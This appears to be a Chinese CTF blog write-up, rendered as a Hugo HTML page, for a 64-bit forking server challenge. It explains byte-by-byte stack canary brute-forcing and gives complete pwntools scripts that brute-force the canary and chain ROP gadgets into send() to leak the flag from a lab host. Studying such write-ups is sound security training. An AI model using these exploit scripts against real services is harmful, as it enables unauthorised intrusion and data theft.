@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>enumcanary | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先拿到文件我们先查看保护机制：
+可以看到，这道题是打开了栈溢出检测的。
+然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：
+可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：
+程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!
+然后通过ida我们可以看到程序会打开一个‘./flag’文件：
+这里可以看到，通过read函数，将flag读入到了0x602120这个地址。
+然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：
+最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。
+对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。
+爆破canary的基本逻辑为：
+我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\x00’，所以我们从第二位开始爆破，第二位从&quot;\x00&quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。
+假如canary如图：
+我们按位进行爆破：
+那么，我们就可以通过fork函数，对canary进行爆破：
+from pwn import *context.log_level = &#39;debug&#39;canary = b&#34;\x00&#34;padding = b&#34;a&#34;*264for x in range(7):for y in range(1,0x100):p = remote(&#34;127.0.0.1&#34;,10011)print(p.recv())p.send(padding&#43;canary&#43; bytes([y]))try:info = p.recv()print(info)except:p.close()continuep.close()breakcanary &#43;= bytes([y])print(&#34;success get blasting!&#34;)print(&#39;type =&#39;,type(canary))print(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：
+可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/enumcanary/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="enumcanary" />
+<meta property="og:description" content="首先拿到文件我们先查看保护机制：
+可以看到，这道题是打开了栈溢出检测的。
+然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：
+可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：
+程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!
+然后通过ida我们可以看到程序会打开一个‘./flag’文件：
+这里可以看到，通过read函数，将flag读入到了0x602120这个地址。
+然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：
+最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。
+对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。
+爆破canary的基本逻辑为：
+我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\x00’，所以我们从第二位开始爆破，第二位从&quot;\x00&quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。
+假如canary如图：
+我们按位进行爆破：
+那么，我们就可以通过fork函数，对canary进行爆破：
+from pwn import *context.log_level = &#39;debug&#39;canary = b&#34;\x00&#34;padding = b&#34;a&#34;*264for x in range(7):for y in range(1,0x100):p = remote(&#34;127.0.0.1&#34;,10011)print(p.recv())p.send(padding&#43;canary&#43; bytes([y]))try:info = p.recv()print(info)except:p.close()continuep.close()breakcanary &#43;= bytes([y])print(&#34;success get blasting!&#34;)print(&#39;type =&#39;,type(canary))print(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：
+可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/enumcanary/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="enumcanary"/>
+<meta name="twitter:description" content="首先拿到文件我们先查看保护机制：
+可以看到，这道题是打开了栈溢出检测的。
+然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：
+可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：
+程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!
+然后通过ida我们可以看到程序会打开一个‘./flag’文件：
+这里可以看到，通过read函数，将flag读入到了0x602120这个地址。
+然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：
+最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。
+对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。
+爆破canary的基本逻辑为：
+我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\x00’，所以我们从第二位开始爆破，第二位从&quot;\x00&quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。
+假如canary如图：
+我们按位进行爆破：
+那么，我们就可以通过fork函数，对canary进行爆破：
+from pwn import *context.log_level = &#39;debug&#39;canary = b&#34;\x00&#34;padding = b&#34;a&#34;*264for x in range(7):for y in range(1,0x100):p = remote(&#34;127.0.0.1&#34;,10011)print(p.recv())p.send(padding&#43;canary&#43; bytes([y]))try:info = p.recv()print(info)except:p.close()continuep.close()breakcanary &#43;= bytes([y])print(&#34;success get blasting!&#34;)print(&#39;type =&#39;,type(canary))print(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：
+可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来："/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "enumcanary",
+      "item": "https://jellyfish-pro.github.io/ctf/enumcanary/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "enumcanary",
+  "name": "enumcanary",
+  "description": "首先拿到文件我们先查看保护机制：\n可以看到，这道题是打开了栈溢出检测的。\n然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：\n可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：\n程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!\n然后通过ida我们可以看到程序会打开一个‘./flag’文件：\n这里可以看到，通过read函数，将flag读入到了0x602120这个地址。\n然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：\n最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。\n对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。\n爆破canary的基本逻辑为：\n我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\\x00’，所以我们从第二位开始爆破，第二位从\u0026quot;\\x00\u0026quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。\n假如canary如图：\n我们按位进行爆破：\n那么，我们就可以通过fork函数，对canary进行爆破：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rcanary = b\u0026#34;\\x00\u0026#34;\rpadding = b\u0026#34;a\u0026#34;*264\rfor x in range(7):\rfor y in range(1,0x100):\rp = remote(\u0026#34;127.0.0.1\u0026#34;,10011)\rprint(p.recv())\rp.send(padding+canary+ bytes([y]))\rtry:\rinfo = p.recv()\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rcanary += bytes([y])\rprint(\u0026#34;success get blasting!\u0026#34;)\rprint(\u0026#39;type =\u0026#39;,type(canary))\rprint(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：\n可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先拿到文件我们先查看保护机制：\n可以看到，这道题是打开了栈溢出检测的。\n然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：\n可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：\n程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!\n然后通过ida我们可以看到程序会打开一个‘./flag’文件：\n这里可以看到，通过read函数，将flag读入到了0x602120这个地址。\n然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：\n最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。\n对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。\n爆破canary的基本逻辑为：\n我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\\x00’，所以我们从第二位开始爆破，第二位从\"\\x00\"开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。\n假如canary如图：\n我们按位进行爆破：\n那么，我们就可以通过fork函数，对canary进行爆破：\nfrom pwn import *\rcontext.log_level = 'debug'\rcanary = b\"\\x00\"\rpadding = b\"a\"*264\rfor x in range(7):\rfor y in range(1,0x100):\rp = remote(\"127.0.0.1\",10011)\rprint(p.recv())\rp.send(padding+canary+ bytes([y]))\rtry:\rinfo = p.recv()\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rcanary += bytes([y])\rprint(\"success get blasting!\")\rprint('type =',type(canary))\rprint(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：\n可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：\n注： 因为是客户端的问题，所以这里我们需要使用send函数，将flag发送到客户端。\nsend函数会有四个参数：\nextern ssize_t send (int __fd, const void *__buf, size_t __n, int __flags)\r1.__fd：套接字描述符：\r2.__buf：指向想 发送消息/接收消息 数据的缓冲区地址的指针\r3. __n：想要 发送消息/接收消息 缓冲区的最大尺寸\r4.__flags:发送/接收标记(一般设置0) 这里必须要保证__fd的参数和我们客户端服务端的套接字描述一致。这样才能保证我们客户端接收到flag。\n而客户端会给我们显示程序的fd：\n然后我们将fd = 5 使用ROP传递给rdi就可以了\n**注：**这里我重新启动了程序，所以这里的canary和上面爆破出来的不一样\ncanary_local = b'\\x00\\xdb\\x46\\x11\\xa3\\x9b\\x01\\xf7'\rp = remote(\"127.0.0.1\",10011)\rpop_rdi_ret = 0x400fe3\rcall_send = 0x400BFE\rsend_addr = 0x400BDD\rpop_rsi_ret = 0x400fe1\rpayload = b'a'*264 + canary_local + b'b'*8 +p64(pop_rdi_ret) + p64(5)+p64(send_addr)\rp.recvuntil('game!')\rp.sendline(payload)\rp.recv()\rprint(\"recv = \",p.recvuntil(\"}\",drop = False))\rp.interactive() 这样就可以接收到我们本地的flag了：\n上面我们在本地接收了flag文件，我们知道，接收到文件需要知道__fd参数，我们才能接收到flag\n但是在远程环境下，我们不知道远程环境的__fd参数。\n这里我们还是先将远程环境的canary给爆破出来：\n但是接下来，我们并不知道远程环境的__fd参数，所以我们只能按个尝试：\ncanary_remote = b'\\x00\\xf7\\xeb\\xfd\\x25\\x58\\x61\\xcd'\rpop_rdi_ret = 0x400fe3\rcall_send = 0x400BFE\rsend_addr = 0x400BDD\rpop_rsi_ret = 0x400fe1\rfor i in range(1,255):\rp = remote(\"10.0.25.109\",10011)\rpayload = b'a'*264 + canary_remote + b'b'*8 payload += p64(pop_rdi_ret) + p64(i)+p64(send_addr)\rp.recvuntil('game!')\rp.sendline(payload)\rtry:\rp.recv()\rinfo = p.recvuntil(\"}\")\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak 这里我们使用了一个循环，从0开始给远程发送消息，直到接收到flag：\n最后的exp：\nfrom pwn import *\rcontext.log_level = 'debug'\r'''\r#爆破canary\rcanary = b\"\\x00\"\rpadding = b\"a\"*264\rfor x in range(7):\rfor y in range(1,0x100):\rp = remote(\"10.0.25.109\",10011)\rprint(p.recv())\rp.send(padding+canary+ bytes([y]))\rtry:\rinfo = p.recv()\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rcanary += bytes([y])\rprint(\"success get blasting!\")\rprint('type =',type(canary))\rprint(canary)\r'''\r#挨个尝试fd\rcanary_remote = b'\\x00\\xf7\\xeb\\xfd\\x25\\x58\\x61\\xcd'\rcanary_local = b'\\x00\\xdb\\x46\\x11\\xa3\\x9b\\x01\\xf7'\rpop_rdi_ret = 0x400fe3\rcall_send = 0x400BFE\rsend_addr = 0x400BDD\rpop_rsi_ret = 0x400fe1\rfor i in range(1,255):\rp = remote(\"10.0.25.109\",10011)\rpayload = b'a'*264 + canary_remote + b'b'*8 payload += p64(pop_rdi_ret) + p64(i)+p64(send_addr)\rp.recvuntil('game!')\rp.sendline(payload)\rtry:\rp.recv()\rinfo = p.recvuntil(\"}\")\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rp.interactive() ",
+  "wordCount" : "293",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/enumcanary/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      enumcanary
+    </h1>
+    <div class="post-meta">2 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e6%b3%a8" aria-label="注："><strong>注：</strong></a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>首先拿到文件我们先查看保护机制：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220507174344377.png" alt="image-20220507174344377"  />
+</p>
+<p>可以看到，这道题是打开了栈溢出检测的。</p>
+<p>然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220507174447479.png" alt="image-20220507174447479"  />
+</p>
+<p>可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511111105979.png" alt="image-20220511111105979"  />
+</p>
+<p>程序会让我们输入一串字符（这里输入的时aaaa），然后返回<strong>Message received!</strong></p>
+<p>然后通过ida我们可以看到程序会打开一个‘./flag’文件：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511104028163.png" alt="image-20220511104028163"  />
+</p>
+<p>这里可以看到，通过read函数，将flag读入到了0x602120这个地址。</p>
+<p>然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511104343792.png" alt="image-20220511104343792"  />
+</p>
+<p>最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。</p>
+<p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。</p>
+<p>爆破canary的基本逻辑为：</p>
+<p>我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”<strong>，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的</strong>Message received!<strong>。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\x00’，所以我们从第二位开始爆破，第二位从&quot;\x00&quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到</strong>Message received!**，所以如果有接收，就爆破下一位。</p>
+<p>假如canary如图：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511112735292.png" alt="image-20220511112735292"  />
+</p>
+<p>我们按位进行爆破：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511113357120.png" alt="image-20220511113357120"  />
+</p>
+<p>那么，我们就可以通过fork函数，对canary进行爆破：</p>
+<pre tabindex="0"><code>from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+canary = b&#34;\x00&#34;
+padding = b&#34;a&#34;*264
+for x in range(7):
+	for y in range(1,0x100):
+		p = remote(&#34;127.0.0.1&#34;,10011)
+		print(p.recv())
+		p.send(padding+canary+ bytes([y]))
+		try:
+			info = p.recv()
+			print(info)
+		except:
+			p.close()
+			continue
+		p.close()
+		break
+	canary += bytes([y])
+print(&#34;success get blasting!&#34;)
+print(&#39;type =&#39;,type(canary))
+
+print(canary)
+</code></pre><p>这里我们先在本地进行连接，实验一下爆破canary的exp：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511110442110.png" alt="image-20220511110442110"  />
+</p>
+<p>可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：</p>
+<h3 id="注"><strong>注：</strong><a hidden class="anchor" aria-hidden="true" href="#注">#</a></h3>
+<p>因为是客户端的问题，所以这里我们需要使用send函数，将flag发送到客户端。</p>
+<p>send函数会有四个参数：</p>
+<pre tabindex="0"><code>extern ssize_t send (int __fd, const void *__buf, size_t __n, int __flags)
+1.__fd：套接字描述符：
+2.__buf：指向想 发送消息/接收消息 数据的缓冲区地址的指针
+3. __n：想要 发送消息/接收消息 缓冲区的最大尺寸
+4.__flags:发送/接收标记(一般设置0)
+</code></pre><p>这里必须要保证__fd的参数和我们客户端服务端的套接字描述一致。这样才能保证我们客户端接收到flag。</p>
+<p>而客户端会给我们显示程序的fd：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511143722145.png" alt="image-20220511143722145"  />
+</p>
+<p>然后我们将fd = 5 使用ROP传递给rdi就可以了</p>
+<p>**注：**这里我重新启动了程序，所以这里的canary和上面爆破出来的不一样</p>
+<pre tabindex="0"><code>canary_local = b&#39;\x00\xdb\x46\x11\xa3\x9b\x01\xf7&#39;
+
+
+p = remote(&#34;127.0.0.1&#34;,10011)
+pop_rdi_ret = 0x400fe3
+call_send = 0x400BFE
+send_addr = 0x400BDD
+pop_rsi_ret = 0x400fe1
+
+
+
+payload = b&#39;a&#39;*264 + canary_local + b&#39;b&#39;*8 +p64(pop_rdi_ret) + p64(5)+p64(send_addr)
+
+p.recvuntil(&#39;game!&#39;)
+
+p.sendline(payload)
+
+p.recv()
+print(&#34;recv = &#34;,p.recvuntil(&#34;}&#34;,drop = False))
+
+p.interactive()
+</code></pre><p>这样就可以接收到我们本地的flag了：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511144428375.png" alt="image-20220511144428375"  />
+</p>
+<p>上面我们在本地接收了flag文件，我们知道，接收到文件需要知道__fd参数，我们才能接收到flag</p>
+<p>但是在远程环境下，我们不知道远程环境的__fd参数。</p>
+<p>这里我们还是先将远程环境的canary给爆破出来：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511150109911.png" alt="image-20220511150109911"  />
+</p>
+<p>但是接下来，我们并不知道远程环境的__fd参数，所以我们只能按个尝试：</p>
+<pre tabindex="0"><code>canary_remote = b&#39;\x00\xf7\xeb\xfd\x25\x58\x61\xcd&#39;
+pop_rdi_ret = 0x400fe3
+call_send = 0x400BFE
+send_addr = 0x400BDD
+pop_rsi_ret = 0x400fe1
+
+for i in range(1,255):
+
+	p = remote(&#34;10.0.25.109&#34;,10011)
+	payload = b&#39;a&#39;*264 + canary_remote + b&#39;b&#39;*8 
+	payload += p64(pop_rdi_ret) + p64(i)+p64(send_addr)
+	p.recvuntil(&#39;game!&#39;)
+	p.sendline(payload)
+	try:
+		p.recv()
+		info = p.recvuntil(&#34;}&#34;)
+		print(info)
+	except:
+		p.close()
+		continue
+	p.close()
+	break
+</code></pre><p>这里我们使用了一个循环，从0开始给远程发送消息，直到接收到flag：</p>
+<p><img loading="lazy" src="/ctf/enumcanary.img/image-20220511150758756.png" alt="image-20220511150758756"  />
+</p>
+<p>最后的exp：</p>
+<pre tabindex="0"><code>from pwn import *
+
+context.log_level = &#39;debug&#39;
+&#39;&#39;&#39;
+#爆破canary
+canary = b&#34;\x00&#34;
+padding = b&#34;a&#34;*264
+for x in range(7):
+	for y in range(1,0x100):
+		p = remote(&#34;10.0.25.109&#34;,10011)
+		print(p.recv())
+		p.send(padding+canary+ bytes([y]))
+		try:
+			info = p.recv()
+			print(info)
+		except:
+			p.close()
+			continue
+		p.close()
+		break
+	canary += bytes([y])
+print(&#34;success get blasting!&#34;)
+print(&#39;type =&#39;,type(canary))
+
+print(canary)
+&#39;&#39;&#39;
+
+#挨个尝试fd
+canary_remote = b&#39;\x00\xf7\xeb\xfd\x25\x58\x61\xcd&#39;
+canary_local = b&#39;\x00\xdb\x46\x11\xa3\x9b\x01\xf7&#39;
+
+
+pop_rdi_ret = 0x400fe3
+call_send = 0x400BFE
+send_addr = 0x400BDD
+pop_rsi_ret = 0x400fe1
+
+for i in range(1,255):
+
+	p = remote(&#34;10.0.25.109&#34;,10011)
+	payload = b&#39;a&#39;*264 + canary_remote + b&#39;b&#39;*8 
+	payload += p64(pop_rdi_ret) + p64(i)+p64(send_addr)
+	p.recvuntil(&#39;game!&#39;)
+	p.sendline(payload)
+	try:
+		p.recv()
+		info = p.recvuntil(&#34;}&#34;)
+		print(info)
+	except:
+		p.close()
+		continue
+	p.close()
+	break
+
+p.interactive()
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>[置顶] 注意事项</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/format0/">
+    <span class="title">Next »</span>
+    <br>
+    <span>format0</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
